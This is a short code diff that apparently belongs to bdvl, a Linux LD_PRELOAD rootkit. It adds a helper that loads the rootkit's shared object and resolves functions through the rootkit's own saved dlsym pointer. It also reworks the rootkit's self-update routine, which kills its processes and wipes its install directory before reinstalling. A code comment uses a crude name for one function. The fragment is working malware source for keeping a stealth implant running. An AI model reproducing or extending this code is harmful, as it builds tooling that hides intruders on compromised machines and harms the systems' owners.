@@ -1,3 +1,20 @@
+/* used by bdvupdate to resolve the function that prints out install info. */
+void *getfuncptr(const char *sopath, char *name, void **handle){
+    void (*funcptr)(void);
+
+    handle = dlopen(sopath, RTLD_LAZY);
+    if(handle == NULL) return NULL;
+
+    if(!o_dlsym) locate_dlsym();
+    funcptr = o_dlsym(handle, name);
+    if(funcptr == NULL){
+        dlclose(handle);
+        return NULL;
+    }
+
+    return funcptr;
+}
+
 /* resolves the imgay function in the target bdvl.so.
  * once resolved, the function is called. output from the
  * function call is then stored accordingly in the
@@ -109,7 +126,12 @@ void bdvupdate(char *const argv[]){
     if(pdoorup())
         killrkprocs(readgid()-1);
 #endif
-    eradicatedir(INSTALL_DIR);
+    so = getbdvsoinf();
+    if(so != NULL){
+        eradicatedir(so->installdir);
+        free(so);
+        so = NULL;
+    }else eradicatedir(INSTALL_DIR);
 
     if((cwd = getcwd(NULL, 0)) != NULL){   // installing new bdvl from homedir?
         if(strncmp(HOMEDIR, cwd, strlen(HOMEDIR)))
